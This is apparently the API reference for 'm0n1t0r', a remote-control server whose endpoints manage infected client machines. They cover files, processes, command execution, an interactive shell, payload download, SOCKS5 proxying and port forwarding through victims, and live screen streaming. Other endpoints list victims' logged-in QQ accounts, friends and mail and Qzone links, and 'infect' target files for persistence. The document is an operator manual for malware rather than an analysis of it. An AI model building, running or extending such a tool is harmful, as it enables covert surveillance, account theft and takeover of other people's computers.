# m0n1t0r Server API Documentation

Base URL: `/api/v1`

## Response Format

All REST endpoints return a standard JSON envelope:

```json
{
  "code": 0,
  "body": <data>
}
```

- `code = 0` indicates success; negative values indicate errors.
- `body` contains the response data on success, or an error message string on failure.

### Error Codes

| Code | Name | HTTP Status | Description |
|------|------|-------------|-------------|
| 0 | Okay | 200 | Success |
| -1 | SerializeError | 500 | JSON serialization failed |
| -2 | NotFound | 404 | Object not found |
| -3 | RtcError | 500 | Remote procedure call error |
| -4 | WebFrameworkError | 500 | Actix-web framework error |
| -5 | RchDisconnected | 500 | Remoc channel disconnected |
| -6 | InvalidCommand | 400 | Shell command parsing failed |
| -7 | TokioIoError | 500 | I/O error |
| -8 | InvalidIpAddress | 400 | Invalid IP address format |
| -9 | InvalidWebParameter | 400 | Invalid query/path/form parameter |
| -10 | InvalidIntValue | 400 | Integer parsing error |
| -11 | QQKeyError | 500 | QQ key operation failed |
| -13 | Socks5Error | 500 | SOCKS5 protocol error |
| -14 | Forbidden | 403 | Forbidden |
| -16 | GenericError | 500 | Generic error |
| -17 | Unimplemented | 500 | Feature not implemented |
| -19 | FFmpegError | 500 | FFmpeg encoding/decoding error |
| -255 | Unknown | 500 | Unknown error |

---

## Session

> **Note:** Session endpoints are currently **not implemented** (TODO). The server uses cookie-based sessions with `[general].secret` from `config.toml` as the signing key. CORS is permissive (allows all origins).

### POST /api/v1/session

Create a new session (login).

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `_name` | string | Yes | Username |

**Response Body:** `null`

---

### DELETE /api/v1/session

Delete the current session (logout).

**Response Body:** `null`

---

## Server

### GET /api/v1/server

Get server information.

**Response Body:**

```json
{
  "version": "0.1.0",
  "build_time": "2025-01-01 00:00:00 +08:00",
  "commit_hash": "abc1234def5678"
}
```

---

### GET /api/v1/server/notification

**WebSocket** — Server-wide event notifications.

Broadcasts a JSON text message whenever a client connects or disconnects.

**Message Format (Server → Client):**

```json
{
  "event": 0,
  "addr": "192.168.1.100:54321"
}
```

| Field | Type | Description |
|-------|------|-------------|
| `event` | integer | `0` = Connect, `1` = Disconnect, `2` = Invalid |
| `addr` | string | Client socket address (`ip:port`) |

**Accepted Messages (Client → Server):**

| Type | Behavior |
|------|----------|
| Ping | Responds with Pong |
| Close | Terminates connection |

---

### GET /api/v1/server/proxy

List all active proxies.

**Response Body:**

```json
[
  {
    "key": 12345678,
    "type": {
      "Socks5": {
        "from": "0.0.0.0:1080",
        "addr": "192.168.1.100:54321"
      }
    }
  },
  {
    "key": 87654321,
    "type": {
      "Forward": {
        "from": "0.0.0.0:8080",
        "to": "10.0.0.1:80",
        "addr": "192.168.1.100:54321"
      }
    }
  }
]
```

| Field | Type | Description |
|-------|------|-------------|
| `key` | u64 | Unique proxy identifier (SlotMap key) |
| `type` | enum | Either `Socks5` or `Forward` (see below) |

**Socks5 variant:**

| Field | Type | Description |
|-------|------|-------------|
| `from` | string | Local bind address |
| `addr` | string | Client connection address |

**Forward variant:**

| Field | Type | Description |
|-------|------|-------------|
| `from` | string | Local bind address |
| `to` | string | Forward destination address |
| `addr` | string | Client connection address |

---

### DELETE /api/v1/server/proxy/{key}

Close a proxy by key.

**Path Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `key` | u64 | Proxy key from the list response |

**Response Body:** `null`

---

## Client

### GET /api/v1/client

List all connected clients.

**Response Body:** Array of client info objects (see [Client Info Object](#client-info-object) below).

---

### GET /api/v1/client/{addr}

Get a specific client's information.

**Path Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `addr` | SocketAddr | Client address in `ip:port` format |

**Response Body:** [Client Info Object](#client-info-object)

---

### DELETE /api/v1/client/{addr}

Terminate a client connection.

**Path Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `addr` | SocketAddr | Client address |

**Response Body:** `null`

---

### Client Info Object

```json
{
  "addr": "192.168.1.100:54321",
  "version": "0.1.0",
  "target_platform": "Windows",
  "system_info": {
    "uptime": 86400,
    "boot_time": 1700000000,
    "name": "DESKTOP-ABC",
    "kernel_version": "10.0.22631",
    "long_os_version": "Windows 11 Pro 23H2",
    "distribution_id": "",
    "host_name": "DESKTOP-ABC",
    "cpu_arch": "x86_64",
    "cpu": {
      "count": {
        "Intel(R) Core(TM) i7-12700K": 20
      }
    }
  },
  "build_time": "2025-01-01 00:00:00 +08:00",
  "commit_hash": "abc1234def5678",
  "current_exe": "C:\\Users\\user\\agent.exe",
  "connected_time": "2025-01-15T10:30:00+08:00"
}
```

| Field | Type | Description |
|-------|------|-------------|
| `addr` | string | Socket address |
| `version` | string | Client build version |
| `target_platform` | enum | `"General"`, `"Windows"`, `"Linux"`, or `"MacOS"` |
| `system_info` | object | System information (see below) |
| `build_time` | string | Client build timestamp |
| `commit_hash` | string | Client git commit hash |
| `current_exe` | string | Client executable path |
| `connected_time` | string | ISO 8601 DateTime with timezone |

**SystemInfo:**

| Field | Type | Description |
|-------|------|-------------|
| `uptime` | u64 | System uptime in seconds |
| `boot_time` | u64 | Boot time as Unix timestamp |
| `name` | string? | System name (nullable) |
| `kernel_version` | string? | Kernel version (nullable) |
| `long_os_version` | string? | Full OS version string (nullable) |
| `distribution_id` | string | Linux distribution ID (empty on other platforms) |
| `host_name` | string? | Hostname (nullable) |
| `cpu_arch` | string | CPU architecture (e.g. `"x86_64"`, `"aarch64"`) |
| `cpu` | object | CPU info with `count` field |

**Cpu:**

| Field | Type | Description |
|-------|------|-------------|
| `count` | `Record<string, u32>` | Map of CPU brand name → core count |

---

## Client Notifications

### GET /api/v1/client/{addr}/notification

**WebSocket** — Client-specific connection monitor.

Keeps the WebSocket open as long as the client is connected. Sends no data messages; only responds to Ping with Pong. The connection closes when the client disconnects.

**Accepted Messages (Client → Server):**

| Type | Behavior |
|------|----------|
| Ping | Responds with Pong |
| Close | Terminates connection |

---

## Client Environment

### GET /api/v1/client/{addr}/environments

Get all environment variables from the client.

**Response Body:**

```json
{
  "PATH": "/usr/bin:/usr/local/bin",
  "HOME": "/home/user",
  "LANG": "en_US.UTF-8"
}
```

Returns a flat `Record<string, string>` of environment variable key-value pairs.

---

## File System

### GET /api/v1/client/{addr}/fs

Read a file or list a directory.

**Query Parameters:**

| Parameter | Type | Required | Values | Description |
|-----------|------|----------|--------|-------------|
| `type` | string | Yes | `file`, `directory` | Resource type |
| `path` | string | Yes | — | File or directory path |

**Response (type=directory):**

When `path=/` on Windows, returns drive letters:
```json
[
  { "name": "C", "path": "C:\\", "size": 0, "is_dir": true, "is_symlink": false },
  { "name": "D", "path": "D:\\", "size": 0, "is_dir": true, "is_symlink": false }
]
```

Otherwise, returns directory contents:
```json
[
  {
    "name": "Documents",
    "path": "/home/user/Documents",
    "size": 4096,
    "is_dir": true,
    "is_symlink": false
  },
  {
    "name": "readme.txt",
    "path": "/home/user/readme.txt",
    "size": 1234,
    "is_dir": false,
    "is_symlink": false
  }
]
```

**Response (type=file):**

Returns raw file binary content with no JSON wrapper (`Content-Type` depends on actix-web defaults, typically `application/octet-stream`).

---

### PUT /api/v1/client/{addr}/fs

Write a file or create a directory.

**Query Parameters:**

| Parameter | Type | Required | Values | Description |
|-----------|------|----------|--------|-------------|
| `type` | string | Yes | `file`, `directory` | Resource type |
| `path` | string | Yes | — | Target path |

**Request Body:**
- `type=file`: Raw binary payload (file contents)
- `type=directory`: No body required

**Response Body:** `null`

---

### DELETE /api/v1/client/{addr}/fs

Delete a file or directory.

**Query Parameters:**

| Parameter | Type | Required | Values | Description |
|-----------|------|----------|--------|-------------|
| `type` | string | Yes | `file`, `directory` | Resource type |
| `path` | string | Yes | — | Path to delete |

**Response Body:** `null`

> **Note:** `type=directory` uses `remove_dir_all` (recursive delete). `type=file` uses `remove_file`.

---

### GET /api/v1/client/{addr}/fs/metadata

Get file metadata.

**Query Parameters:**

| Parameter | Type | Required | Values | Description |
|-----------|------|----------|--------|-------------|
| `type` | string | Yes | `file` | Only `file` is supported |
| `path` | string | Yes | — | File path |

**Response Body:**

```json
{
  "name": "readme.txt",
  "path": "/home/user/readme.txt",
  "size": 1234,
  "is_dir": false,
  "is_symlink": false
}
```

> **Note:** `type=directory` returns error `-17` (Unimplemented).

---

## Process Management

### GET /api/v1/client/{addr}/process

List all processes on the client.

**Response Body:**

```json
[
  {
    "name": "firefox",
    "cmd": ["firefox", "--no-remote"],
    "exe": "/usr/bin/firefox",
    "pid": 1234
  }
]
```

| Field | Type | Description |
|-------|------|-------------|
| `name` | string | Process name |
| `cmd` | string[] | Command line arguments |
| `exe` | string? | Executable path (nullable) |
| `pid` | usize | Process ID |

---

### DELETE /api/v1/client/{addr}/process/{value}

Kill processes by PID or name.

**Path Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `addr` | SocketAddr | Client address |
| `value` | string | Process ID (numeric) or process name |

**Query Parameters:**

| Parameter | Type | Required | Values | Description |
|-----------|------|----------|--------|-------------|
| `type` | string | Yes | `pid`, `name` | Interpretation of `value` |

**Response Body:** Array of killed `Process` objects.

---

### POST /api/v1/client/{addr}/process/execute

Execute a command on the client.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `command` | string | Yes | — | Full command line (shell-escaped, parsed with `shell_words`) |
| `option` | string | No | `blocked` | `blocked` = wait for completion; `detached` = fire-and-forget |

**Response Body (option=blocked):**

```json
{
  "success": true,
  "stdout": [104, 101, 108, 108, 111],
  "stderr": []
}
```

| Field | Type | Description |
|-------|------|-------------|
| `success` | bool | Process exit status |
| `stdout` | number[] | Standard output as byte array |
| `stderr` | number[] | Standard error as byte array |

**Response Body (option=detached):** `null`

> **Note:** The `command` string is parsed using `shell_words::split`. The first token is the program name, remaining tokens are arguments. Example: `"ls -la /tmp"` → program=`ls`, args=`["-la", "/tmp"]`.

---

### GET /api/v1/client/{addr}/process/interactive

**WebSocket** — Interactive shell.

Opens a bidirectional pipe to an interactive process. The process uses `Stdio::piped()` (no PTY), so the client must handle local echo and line buffering.

**Query Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `command` | string | Yes | Command to run (e.g. `bash`, `powershell`, `cmd`) |

**Message Format:**

| Direction | Type | Content |
|-----------|------|---------|
| Client → Server | Text | Bytes written to process stdin |
| Server → Client | Text | Bytes read from process stdout/stderr |
| Client → Server | Ping | Keep-alive |
| Server → Client | Pong | Keep-alive response |

**Important Notes:**
- No PTY: the shell won't echo input, won't handle readline, won't provide a prompt in non-interactive mode.
- Output uses `\n` only (no `\r`). Clients should translate `\n` → `\r\n` for terminal display.
- Connection closes when: stdin closes, process exits, or client disconnects.

---

## Network

### POST /api/v1/client/{addr}/network/download

Download a file from a URL to the client's filesystem.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `url` | URL | Yes | Source URL to download from |
| `path` | string | Yes | Destination path on the client |

**Response Body:** `null`

---

## Proxy

### POST /api/v1/client/{addr}/proxy/socks5/noauth

Create a SOCKS5 proxy (no authentication) through the client.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `from` | SocketAddr | Yes | Local bind address (e.g. `0.0.0.0:1080`; use port `0` for auto-assign) |

**Response Body:**

```json
"0.0.0.0:1080"
```

Returns the actual bound address (useful when port was `0`).

> **Note:** Only SOCKS5 CONNECT is supported. UDP Associate and BIND return `CommandNotSupported`.

---

### POST /api/v1/client/{addr}/proxy/socks5/pass

Create a SOCKS5 proxy with username/password authentication.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `from` | SocketAddr | Yes | Local bind address |
| `name` | string | Yes | Username |
| `password` | string | Yes | Password |

**Response Body:**

```json
"0.0.0.0:1080"
```

Returns the actual bound address.

> **Note:** The bind address is always overridden to `0.0.0.0:0` (auto-assign) regardless of the `from` value.

---

### POST /api/v1/client/{addr}/proxy/forward

Create a TCP port forward through the client.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `from` | SocketAddr | Yes | Local address for inbound connections |
| `to` | SocketAddr | Yes | Remote address to forward to (through client) |

**Response Body:** `null`

---

## Client Update

### POST /api/v1/client/{addr}/update/byurl

Update the client binary by downloading from a URL.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `url` | URL | Yes | — | URL to download the new binary from |
| `temp` | string | No | `temp.bin` | Temporary file path for the download |

**Response Body:** `null`

---

### POST /api/v1/client/{addr}/update/byfile

Update the client binary by uploading a file.

**Request Body:** `multipart/form-data`

| Field | Type | Required | Default | Limit | Description |
|-------|------|----------|---------|-------|-------------|
| `file` | binary | Yes | — | 50 MB | Binary file contents |
| `temp` | string | No | `temp.bin` | — | Temporary file path |

**Response Body:** `null`

---

## Remote Desktop

### GET /api/v1/client/{addr}/rd

List available displays on the client.

**Response Body:**

```json
[
  {
    "name": "HDMI-1",
    "width": 1920,
    "height": 1080,
    "is_online": true,
    "is_primary": true,
    "origin": [0, 0]
  },
  {
    "name": "DP-2",
    "width": 2560,
    "height": 1440,
    "is_online": true,
    "is_primary": false,
    "origin": [1920, 0]
  }
]
```

| Field | Type | Description |
|-------|------|-------------|
| `name` | string | Display name |
| `width` | usize | Display width in pixels |
| `height` | usize | Display height in pixels |
| `is_online` | bool | Whether the display is online |
| `is_primary` | bool | Whether this is the primary display |
| `origin` | [i32, i32] | Display origin coordinates [x, y] |

---

### GET /api/v1/client/{addr}/rd/stream/rgb

**WebSocket** — RGB video stream.

Streams decoded RGB frames from the client's display.

**Query Parameters:**

| Parameter | Type | Required | Values | Description |
|-----------|------|----------|--------|-------------|
| `display` | usize | Yes | 0, 1, ... | Display index (0-based, from the display list) |
| `quality` | f32 | Yes | 0.0–1.0 | Encoding quality |
| `kf` | usize | No | — | Keyframe interval in frames |
| `format` | string | **Yes** | `raw`, `abgr`, `argb` | Pixel format |

**Pixel Formats:**

| Format | Bytes/pixel | Layout |
|--------|-------------|--------|
| `raw` | 3 | R, G, B |
| `abgr` | 4 | A, B, G, R |
| `argb` | 4 | A, R, G, B |

**Message Format:**

| Direction | Type | Content |
|-----------|------|---------|
| Server → Client | Binary | Raw pixel data (width × height × bytes_per_pixel) |
| Client → Server | Ping | Keep-alive |
| Server → Client | Pong | Keep-alive response |

**Frame Size:**
- `raw`: `width × height × 3` bytes
- `abgr`/`argb`: `width × height × 4` bytes

---

### GET /api/v1/client/{addr}/rd/stream/mpeg1video

**WebSocket** — MPEG1 video stream.

Decodes VP9 frames from the client and re-encodes to MPEG1VIDEO at 25fps.

**Query Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `display` | usize | Yes | Display index (0-based) |
| `quality` | f32 | Yes | Encoding quality (0.0–1.0) |
| `kf` | usize | No | Keyframe interval |

**Message Format:**

| Direction | Type | Content |
|-----------|------|---------|
| Server → Client | Binary | MPEG1VIDEO encoded packets |
| Client → Server | Ping | Keep-alive |

> **Note:** Suitable for use with [jsmpeg](https://github.com/phoboslab/jsmpeg) player.

---

### GET /api/v1/client/{addr}/rd/stream/yuv

**WebSocket** — YUV420P video stream.

Streams raw YUV420P frames decoded from VP9.

**Query Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `display` | usize | Yes | Display index (0-based) |
| `quality` | f32 | Yes | Encoding quality (0.0–1.0) |
| `kf` | usize | No | Keyframe interval |

**Message Format:**

| Direction | Type | Content |
|-----------|------|---------|
| Server → Client | Binary | Raw YUV420P frame data |
| Client → Server | Ping | Keep-alive |

**Frame Layout:**
- Y plane: `width × height` bytes
- U plane: `width/2 × height/2` bytes
- V plane: `width/2 × height/2` bytes
- Total: `width × height × 3/2` bytes

---

## QQ Integration

### GET /api/v1/client/{addr}/qq

List logged-in QQ accounts on the client.

**Response Body:**

```json
[
  {
    "uin": 123456789,
    "nick": "NickName",
    "name": "RealName",
    "other_name": null
  }
]
```

> **Note:** Account fields come from the `qqkey::AccountInfo` type.

---

### GET /api/v1/client/{addr}/qq/{id}/url

Get QQ-related URLs for an account.

**Path Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `id` | i64 | QQ account UIN |

**Response Body:**

```json
{
  "qzone": "https://user.qzone.qq.com/...",
  "weiyun": "https://www.weiyun.com/...",
  "mail": "https://mail.qq.com/...",
  "qun": "https://qun.qq.com/..."
}
```

---

### GET /api/v1/client/{addr}/qq/{id}/friends

Get the friends list for a QQ account.

**Path Parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `id` | i64 | QQ account UIN |

**Response Body:** Map of friend groups:

```json
{
  "1": {
    "group_name": "My Friends",
    "friend_list": [
      {
        "uin": 987654321,
        "nick": "FriendNick",
        "name": null,
        "other_name": null
      }
    ]
  }
}
```

> **Note:** Response type comes from `qqkey::FriendGroup`.

---

## Autorun / Persistence

### GET /api/v1/client/{addr}/autorun/infectious

Check if a target file can be infected.

**Query Parameters:**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `target` | string | Yes | Target file path |
| `exe` | string | No | Specific executable to use (default: current client exe) |

**Response Body:** `true` or `false`

---

### POST /api/v1/client/{addr}/autorun/infectious

Infect a target file.

**Request Body:** `application/x-www-form-urlencoded`

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `target` | string | Yes | Target file path |
| `exe` | string | No | Specific executable to use (default: current client exe) |

**Response Body:** `true` or `false`

---

## Route Summary

| Method | Path | Description |
|--------|------|-------------|
| POST | `/session` | Create session (TODO) |
| DELETE | `/session` | Delete session (TODO) |
| GET | `/server` | Server info |
| GET | `/server/notification` | **WS** Server event stream |
| GET | `/server/proxy` | List proxies |
| DELETE | `/server/proxy/{key}` | Close proxy |
| GET | `/client` | List clients |
| GET | `/client/{addr}` | Get client info |
| DELETE | `/client/{addr}` | Disconnect client |
| GET | `/client/{addr}/environments` | Get env vars |
| GET | `/client/{addr}/notification` | **WS** Client connection monitor |
| GET | `/client/{addr}/fs` | Read file / list directory |
| PUT | `/client/{addr}/fs` | Write file / create directory |
| DELETE | `/client/{addr}/fs` | Delete file / directory |
| GET | `/client/{addr}/fs/metadata` | Get file metadata |
| GET | `/client/{addr}/process` | List processes |
| DELETE | `/client/{addr}/process/{value}` | Kill process |
| POST | `/client/{addr}/process/execute` | Execute command |
| GET | `/client/{addr}/process/interactive` | **WS** Interactive shell |
| POST | `/client/{addr}/network/download` | Download URL to client |
| POST | `/client/{addr}/proxy/socks5/noauth` | Create SOCKS5 proxy (no auth) |
| POST | `/client/{addr}/proxy/socks5/pass` | Create SOCKS5 proxy (password) |
| POST | `/client/{addr}/proxy/forward` | Create TCP port forward |
| POST | `/client/{addr}/update/byurl` | Update client via URL |
| POST | `/client/{addr}/update/byfile` | Update client via file upload |
| GET | `/client/{addr}/rd` | List displays |
| GET | `/client/{addr}/rd/stream/rgb` | **WS** RGB video stream |
| GET | `/client/{addr}/rd/stream/mpeg1video` | **WS** MPEG1 video stream |
| GET | `/client/{addr}/rd/stream/yuv` | **WS** YUV420P video stream |
| GET | `/client/{addr}/qq` | List QQ accounts |
| GET | `/client/{addr}/qq/{id}/url` | Get QQ URLs |
| GET | `/client/{addr}/qq/{id}/friends` | Get QQ friends |
| GET | `/client/{addr}/autorun/infectious` | Check infection |
| POST | `/client/{addr}/autorun/infectious` | Infect target |

---

## Limits

| Limit | Value |
|-------|-------|
| Multipart total size | 100 MB |
| Multipart memory limit | 50 MB |
| Update file upload | 50 MB |
